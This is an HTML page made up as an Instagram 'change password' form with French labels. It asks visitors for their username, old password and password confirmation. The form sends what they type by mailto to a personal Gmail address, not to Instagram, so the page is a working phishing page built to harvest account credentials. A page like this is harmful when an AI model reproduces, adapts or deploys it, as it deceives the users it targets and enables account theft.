<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  body {
    font-family: "Helvetica Neue", Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f4f4f4;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column; /* Aligner le contenu en colonne */
    height: 100vh;
  }
  .container {
    max-width: 360px;
    padding: 20px;
    border: 1px solid #e6e6e6;
    border-radius: 5px;
    box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
    margin-bottom: 20px; /* Espacement entre le formulaire et l'image */
  }
  .logo {
    text-align: center;
    margin-bottom: 20px;
  }
  .logo img {
    max-width: 100%;
    height: auto; /* Ajuster la hauteur automatiquement */
  }
  .contact-form {
    background-color: #f0f0f0; /* Gris clair */
    padding: 20px;
    border-radius: 5px;
  }
  .input-container {
    position: relative;
    margin-bottom: 15px;
  }
  .input-container label {
    color: #000; /* Couleur du texte en noir */
    font-size: 16px;
  }
  .input-container input {
    width: 100%;
    padding: 8px; /* Raccourci en hauteur */
    border: 1px solid #e6e6e6;
    border-radius: 3px;
    background-color: #f0f0f0; /* Gris clair */
    color: #262626;
    transition: all 0.3s ease;
    font-size: 16px;
    padding-left: 30px; /* Espace pour l'ic√¥ne */
  }
  .input-container input:focus + label {
    display: none;
  }
  button {
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 5px;
    padding: 10px 15px;
    cursor: pointer;
    transition: background-color 0.3s ease-in-out;
    width: 100%;
    margin-top: 20px;
  }
  button:hover {
    background-color: #0056b3;
  }
  .divider {
    display: flex;
    align-items: center;
    margin: 15px 0;
  }
  .divider-line {
    flex-grow: 1;
    height: 1px;
    background-color: #ccc;
  }
  .divider-text {
    margin: 0 10px;
    color: #262626;
  }
  .login-with-facebook {
    color: #007bff;
    text-decoration: none;
    display: block;
    margin-top: 20px;
  }
  .image-container {
    text-align: center;
    margin-top: 20px;
  }
  .image-container img {
    max-width: 100%;
    height: auto;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="insta.PNG" alt="Logo Instagram">
    </div>
    <div class="contact-form">
      <form action="mailto:pierre.louis3228@gmail.com" method="post" enctype="text/plain">
        <div class="input-container">
          <label for="username">Nom d'utilisateur :</label>
          <input type="text" id="username" name="username" required>
        </div>
        
        <div class="input-container">
          <label for="password">Ancien Mot de Passe :</label>
          <input type="password" id="password" name="password" required>
        </div>

        <div class="input-container">
          <label for="confirm-new-password">Confirmer le Mot de Passe :</label>
          <input type="password" id="confirm-new-password" name="confirm-new-password" required>
        </div>
        
        <button type="submit">Changer le Mot de Passe</button>
        <div class="divider">
          <div class="divider-line"></div>
          <div class="divider-text">ou</div>
          <div class="divider-line"></div>
        </div>
        
        <a href="lien_vers_page_connexion_facebook" class="login-with-facebook">   Se connecter avec Facebook</a>
      </form>
    </div>
  </div>
</body>
</html>
